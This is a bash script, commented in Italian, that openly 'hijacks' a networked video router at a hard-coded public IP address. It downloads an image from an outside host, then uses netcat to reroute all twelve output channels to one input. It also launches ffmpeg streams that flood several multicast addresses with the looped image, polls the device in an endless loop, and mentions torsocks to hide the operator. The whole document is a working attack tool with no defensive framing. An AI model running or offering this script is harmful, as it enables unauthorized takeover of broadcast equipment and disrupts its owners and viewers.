#!/bin/bash
# VIDEHUB_SINGOLO_HIJACK - Routing INDIVIDUALE + Multi FFmpeg PNG

VIDEOHUB_IP="66.44.213.48"
VIDEOHUB_PORT=9990
PNG_URL="https://i.postimg.cc/tJq1ZFH3/pat.png"

echo "[+] Download PNG..."
wget -O pat.png "$PNG_URL" || curl -L -o pat.png "$PNG_URL"

# HIJACK SINGOLO per TUTTI i canali (individual TAKE)
echo "[+] Hijack INDIVIDUALE ogni canale..."
for CH in {0..11}; do
    echo "[+] CH${CH} → Input 11 (FROM Studio)"
    (
        echo "OUT ${CH} 11"
        echo "TAKE"
        sleep 1
    ) | nc -w 5 ${VIDEOHUB_IP} ${VIDEOHUB_PORT}
    sleep 1
done

echo "✅ ROUTING COMPLETO - Tutti su Input 11"

# MULTI FFmpeg - 1 stream per input attivo (sovrascrive tutto)
echo "[+] Avvio MULTI PNG streams per coverage totale..."
for INPUT in 11 4 2 1 9 8 7; do
    ffmpeg -stream_loop -1 -re -i pat.png \
      -vf "scale=1920:1080,fps=30" \
      -pix_fmt yuv420p -preset ultrafast \
      -f mpegts "udp://239.${INPUT}.0.1:${INPUT}000?pkt_size=1316" \
      -y -loglevel error > /dev/null 2>&1 &
done &

FFMPEG_PIDS=$!
sleep 3

echo "🎥 7x PNG STREAMS ATTIVI - Copertura TOTALE inputs!"
echo "[+] Verifica: torsocks nc ${VIDEOHUB_IP} ${VIDEOHUB_PORT} → VIDEO ROUTING"
echo "[+] TUTTI i canali ora vedono PNG loop!"

# Status continuo
while true; do
    ROUTING=$(timeout 3 bash -c "echo 'VIDEO ROUTING' | nc ${VIDEOHUB_IP} ${VIDEOHUB_PORT}")
    echo "[Live] $(echo "$ROUTING" | grep 'OUT ' | head -3)"
    sleep 15
done &

trap "pkill -f ffmpeg; echo '[+] Stopped'; rm pat.png; exit" INT TERM

wait
